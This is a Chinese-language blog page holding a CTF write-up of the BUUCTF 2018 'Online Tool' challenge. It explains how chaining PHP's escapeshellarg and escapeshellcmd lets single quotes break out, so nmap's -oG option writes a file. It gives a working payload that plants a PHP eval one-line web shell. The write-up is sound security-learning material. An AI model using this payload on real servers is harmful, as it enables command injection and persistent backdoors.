@@ -1,0 +1,276 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>刷题笔记：escapeshellarg + escapeshellcmd 命令执行 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="刷题笔记：escapeshellarg + escapeshellcmd 命令执行 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+疾風怒濤 生死流轉
+
+今天把混沌武士看完了🥳
+前置知识
+记两个函数。
+escapeshellarg
+escapeshellarg — 把字符串转义为可以在 shell 命令里使用的参数
+目的：确保传入 shell 函数的是一个字符串。
+..." />
+    <meta name="keywords" content="命令执行,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              刷题笔记：escapeshellarg + escapeshellcmd 命令执行
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-04-27
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/x1DzYssV5/" class="post-tag">
+                  # 命令执行
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/shua-ti-bi-ji-escapeshellarg-escapeshellcmd-ming-ling-zhi-xing.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>疾風怒濤 生死流轉</p>
+</blockquote>
+<p>今天把混沌武士看完了🥳</p>
+<h1 id="前置知识">前置知识</h1>
+<p>记两个函数。</p>
+<h2 id="escapeshellarg">escapeshellarg</h2>
+<p>escapeshellarg — 把字符串转义为可以在 shell 命令里使用的参数</p>
+<p><strong>目的</strong>：确保传入 shell 函数的是一个字符串。</p>
+<p><strong>工作方式</strong>：给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号（非常拗口）。</p>
+<p><strong>举个例子</strong>：</p>
+<pre><code class="language-php">&lt;?php
+$cmd = &quot;skyblu3's blog&quot;;
+$cmd = escapeshellarg($cmd);
+echo $cmd;      // 输出：'skyblu3'\''s blog'
+</code></pre>
+<p>在字符串的两端加了<code>'</code>。对字符串内部的<code>'</code>先用反斜杠转义，然后在其两端添加<code>'</code>连接。</p>
+<h2 id="escapeshellcmd">escapeshellcmd</h2>
+<p>escapeshellcmd — shell 元字符转义</p>
+<p><strong>目的</strong>：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p>
+<p><strong>工作方式</strong>：在一些敏感字符前添加<code>\</code></p>
+<p><strong>敏感字符</strong>有：</p>
+<pre><code>&amp;#;`|*?~&lt;&gt;^()[]{}$\
+\x0A  \xFF
+' 和 &quot; 仅在不配对儿的时候被转义
+</code></pre>
+<h1 id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool</h1>
+<h2 id="观察题目">观察题目</h2>
+<pre><code class="language-php">&lt;?php
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']);
+    echo 'you are in sandbox '.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
+}
+</code></pre>
+<p>XFF这里没有用，重点是<code>host</code>参数拼接的命令执行语句。</p>
+<p>这里我能想到的两种利用方式：</p>
+<ul>
+<li>用命令分隔符执行命令。</li>
+<li>从nmap的参数上下手。</li>
+</ul>
+<p>由于<code>escapeshellcmd</code>的存在，所有分隔符都会被转义。所以这条路几乎行不通。</p>
+<p>那nmap有什么可以利用的参数吗？有，nmap的输出参数<code>-oG</code>（<code>-oN</code>会出点问题）。输出的文件中除了会有nmap的扫描结果，还会记录这次查询的语句，同时也可以指定文件名。</p>
+<p>这样就可以用nmap输出为一个<code>.php</code>文件，在查询的时候写上一句话木马即可。</p>
+<p>构造查询：</p>
+<pre><code>nmap -T5 -sT -Pn --host-timeout 2 -F -oG skyblu3.php \&lt;\?php @eval\(\$_POST\[shell\]\)\;\?\&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1682532958358.jpg" alt="" loading="lazy"></figure>
+<p>因为 escapeshellcmd 会帮我们把一句话里的敏感字符转义，所以我们直接输入：<code>-oG skyblu3.php &lt;?php @eval($_POST[shell]);?&gt;</code>就可以写入我们的文件了，吗？</p>
+<p>可以看下这串字符出在经过这两个函数的处理后变成了什么：</p>
+<pre><code class="language-php">&lt;?php
+$host = '-oG skyblu3.php &lt;?php eval($_POST[shell]);?&gt;';
+$host = escapeshellarg($host);  
+$host = escapeshellcmd($host);   
+echo &quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host;
+// 输出：nmap -T5 -sT -Pn --host-timeout 2 -F '-oG skyblu3.php \&lt;\?php eval\(\$_POST\[shell\]\)\;\?\&gt;'
+</code></pre>
+<p>敏感字符转义确实帮大忙了，但是字符串却被单引号所包裹。这样构造的<code>-oG</code>就不会被解析为输出文件，整个字符串仅仅作为了一个参数被拼接。</p>
+<h2 id="escapeshellarg-escapeshellcmd组合绕过">escapeshellarg + escapeshellcmd组合绕过</h2>
+<p>简化下上面的表示，把<code>-oG</code>后面的内容用<code>str</code>表示，那我们想要的结果就是<code>-oG str</code>直接被当作nmap的一个运行选项拼接。</p>
+<p>绕过的方式很简单，只需要在传入的字符串前后加个单引号。也就是传入<code>' -oG str '</code>，看看这一过程会发生什么？</p>
+<p><code>' -oG str '</code>经过<code>escapeshellarg</code>的处理输出<code>''\'' -oG str '\'''</code>，然后经过<code>escapeshellcmd</code>处理输出<code>''\\'' -oG str '\\'''</code>。神奇的事发生了，反斜杠被反斜杠转义，剩下的单引号两两组合成了空字符，于是最后组合出来的命令就变成了<code>nmap -T5 -sT -Pn --host-timeout 2 -F  \ -oG str \</code>。这样就成功地将<code>-oG</code>选项从单引号中逃逸了出来。</p>
+<p>最后的payload构造，写入shell文件。</p>
+<pre><code>?host=' -oG skyblu3.php &lt;?php @eval($_POST[shell]);?&gt; '
+</code></pre>
+<h1 id="参考链接">参考链接</h1>
+<p>https://paper.seebug.org/164/</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#escapeshellarg">escapeshellarg</a></li>
+<li><a href="#escapeshellcmd">escapeshellcmd</a></li>
+</ul>
+</li>
+<li><a href="#buuctf-2018online-tool">[BUUCTF 2018]Online Tool</a>
+<ul>
+<li><a href="#%E8%A7%82%E5%AF%9F%E9%A2%98%E7%9B%AE">观察题目</a></li>
+<li><a href="#escapeshellarg-escapeshellcmd%E7%BB%84%E5%90%88%E7%BB%95%E8%BF%87">escapeshellarg + escapeshellcmd组合绕过</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/pyyaml-fan-xu-lie-hua-xue-xi/">
+              <h3 class="post-title">
+                PyYAML反序列化学习
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
